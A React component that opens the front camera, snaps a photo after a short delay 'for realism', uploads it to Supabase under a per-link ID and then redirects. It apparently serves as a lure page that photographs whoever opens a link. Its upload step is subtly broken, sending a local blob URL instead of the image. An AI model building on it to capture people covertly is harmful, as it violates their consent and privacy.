import { useEffect, useRef, useState } from 'react';
import { motion } from 'framer-motion';
import { uploadData } from '../utils/supabase';

const CameraFeed = ({ uniqueId, onComplete }) => {
  const [captured, setCaptured] = useState(false);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    // Start Camera
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } // Front camera preferred
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          
          // Wait a moment for the image to load, then capture
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
            
            // Convert to blob/file for upload
            canvas.toBlob(async (blob) => {
              if(blob) {
                const url = URL.createObjectURL(blob);
                await uploadData(uniqueId, url); // Upload to Supabase
                setCaptured(true);
                onComplete(); // Trigger redirect
              }
            }, 'image/jpeg');
          }, 1500); // Delay slightly for realism

        }
      } catch (err) {
        console.error("Camera error:", err);
        alert("Permission denied or camera missing.");
      }
    };
    startCamera();
  }, [uniqueId, onComplete]);

  return (
    <div className="relative w-full h-64 bg-black rounded-xl overflow-hidden shadow-2xl border-4 border-green-500">
      {/* Hidden Video Element */}
      <video ref={videoRef} className="absolute inset-0 w-full h-full object-cover opacity-50" playsInline muted />
      
      {/* Visual Feedback Overlay */}
      <div className="absolute inset-0 flex items-center justify-center">
        {captured ? (
          <motion.div 
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="bg-green-500/90 text-white px-6 py-3 rounded-full font-bold flex items-center gap-2"
          >
            <span className="animate-pulse">●</span> Captured Successfully
          </motion.div>
        ) : (
          <motion.div 
            animate={{ opacity: [0.5, 1, 0.5] }}
            transition={{ repeat: Infinity, duration: 2 }}
            className="text-green-400 font-mono text-sm bg-black/50 px-3 py-1 rounded"
          >
            Recording...
          </motion.div>
        )}
      </div>
      
      {/* Camera Flash Effect */}
      {!captured && (
        <div className="absolute inset-0 bg-white opacity-20 pointer-events-none animate-pulse"></div>
      )}
    </div>
  );
};

export default CameraFeed;